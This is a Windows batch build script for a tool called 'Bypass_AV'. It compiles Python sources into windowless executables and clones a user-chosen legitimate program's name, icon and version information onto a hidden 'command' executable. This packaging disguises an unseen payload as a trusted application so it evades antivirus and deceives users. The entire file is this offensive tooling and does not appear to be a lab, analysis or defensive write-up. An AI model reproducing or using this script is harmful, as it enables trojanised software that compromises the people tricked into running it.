@echo off

rem Get user input for "choice" variable
echo Create Bypass_AV:
set /p choice="(Y/n)? "

rem Activate virtual environment
call Scripts\activate

rem Validate user input
if /I "%choice%" == "Y" (
    rem Navigate to Bypass_AV directory
    cd Bypass_AV

    rem Create Bypass_AV executable
    pyinstaller -F -w --name=config --icon=icon.ico --version-file=information.txt Bypass_AV.py

    rem Clean up unnecessary files
    del config.spec
    move dist\config.exe ..\Bypass_AV
    rmdir /s /q dist build 

    echo Bypass_AV executable created successfully!

    rem Navigate to parent directory
    cd ..\  
)

rem Get user input for "folder" and "file" variable
set /p folder="Enter folder name: "
set /p file="Enter file name: "

rem Copy files to specified folder
cd command
copy information.yaml "..\%folder%"
copy command.py "..\%folder%"
cd ..\Bypass_AV
copy config.exe "..\%folder%"

rem Copy folder to specified folder
cd ..\
xcopy "resource_hacker" "%folder%\resource_hacker" /e /i /h

rem Navigate to "folder" directory
cd "%folder%"

rem Rename "file" to data
ren %file%.exe data.exe

rem Extract icon from data.exe
icoextract data.exe icon.ico

rem Change "file" icon
resource_hacker\ResourceHacker.exe -open data.exe -save data.exe -action modify -res resource_hacker\icon.ico -mask ICONGROUP,MAINICON

rem Create version file
create-version-file information.yaml --outfile information.txt

rem Create command executable
pyinstaller --onefile --icon=icon.ico --name=%file% --version-file=information.txt --noconsole command.py

rem Clean up unnecessary files
del information.yaml command.py information.txt icon.ico %file%.spec
move dist\%file%.exe ..\%folder%
rmdir /s /q dist build resource_hacker

echo Command executable created successfully!

pause